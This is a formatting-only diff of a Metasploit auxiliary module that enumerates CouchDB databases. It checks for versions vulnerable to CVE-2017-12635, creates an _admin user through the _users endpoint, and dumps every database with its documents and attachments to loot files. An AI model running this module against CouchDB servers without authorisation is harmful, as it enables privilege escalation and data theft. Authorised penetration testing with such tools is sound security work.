@@ -8,27 +8,28 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'CouchDB Enum Utility',
-      'Description' => %q{
-        This module enumerates databases on CouchDB using the REST API
-        (without authentication by default).
-      },
-      'References'  =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'CouchDB Enum Utility',
+        'Description' => %q{
+          This module enumerates databases on CouchDB using the REST API
+          (without authentication by default).
+        },
+        'References' => [
           ['CVE', '2017-12635'],
           ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
           ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'Max Justicz', # Vulnerability discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit module
           'Hendrik Van Belleghem', # (@hendrikvb) Database dump enhancements
           'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used
         ],
-      'License'     => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
@@ -40,7 +41,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12)]),
         OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
 
-      ])
+      ]
+    )
   end
 
   def valid_response(res)
@@ -52,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-        'uri'    => '/',
+        'uri' => '/',
         'method' => 'GET'
       )
     rescue Rex::ConnectionError
@@ -88,8 +90,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     return Exploit::CheckCode::Unknown unless get_version
+
     version = Rex::Version.new(@version)
     return Exploit::CheckCode::Unknown if version.version.empty?
+
     vprint_good("#{peer} - Found CouchDB version #{version}")
 
     return Exploit::CheckCode::Appears if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))
@@ -100,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_dbs(auth)
     begin
       res = send_request_cgi(
-        'uri'    => normalize_uri(target_uri.path),
+        'uri' => normalize_uri(target_uri.path),
         'method' => 'GET'
       )
 
@@ -118,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{peer} - Enumerating Databases...")
     results = JSON.pretty_generate(temp)
     print_good("#{peer} - Databases:\n\n#{results}\n")
-     path = store_loot(
+    path = store_loot(
       'couchdb.enum',
       'application/json',
       rhost,
@@ -130,31 +134,31 @@ class MetasploitModule < Msf::Auxiliary
     res.get_json_document.each do |db|
       r = send_request_cgi(
         'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs"),
-        'method'=> 'GET',
+        'method' => 'GET',
         'authorization' => auth,
-        'vars_get' => {'include_docs' => 'true', 'attachments' => 'true'}
-       )
-       if r.code != 200
-         print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
-         return
-       end
-       temp = JSON.parse(r.body)
-       results = JSON.pretty_generate(temp)
-       path = store_loot(
-         "couchdb.#{db}",
-         "application/json",
-         rhost,
-         results,
-         "CouchDB Databases"
-       )
-       print_good("#{peer} - #{db} saved in: #{path}")
+        'vars_get' => { 'include_docs' => 'true', 'attachments' => 'true' }
+      )
+      if r.code != 200
+        print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
+        return
+      end
+      temp = JSON.parse(r.body)
+      results = JSON.pretty_generate(temp)
+      path = store_loot(
+        "couchdb.#{db}",
+        "application/json",
+        rhost,
+        results,
+        "CouchDB Databases"
+      )
+      print_good("#{peer} - #{db} saved in: #{path}")
     end
   end
 
   def get_server_info(auth)
     begin
       res = send_request_cgi(
-        'uri'    => '/',
+        'uri' => '/',
         'method' => 'GET'
       )
 
@@ -196,11 +200,13 @@ class MetasploitModule < Msf::Auxiliary
 "password": "#{password}"
 })
     res = send_request_cgi(
-    { 'uri'    => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
-      'method' => 'PUT',
-      'ctype'  => 'text/json',
-      'data'   => data,
-    }, timeout)
+      {
+        'uri' => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
+        'method' => 'PUT',
+        'ctype' => 'text/json',
+        'data' => data,
+      }, timeout
+    )
 
     unless res && res.code == 200
       print_error("#{peer} - Change Failed")
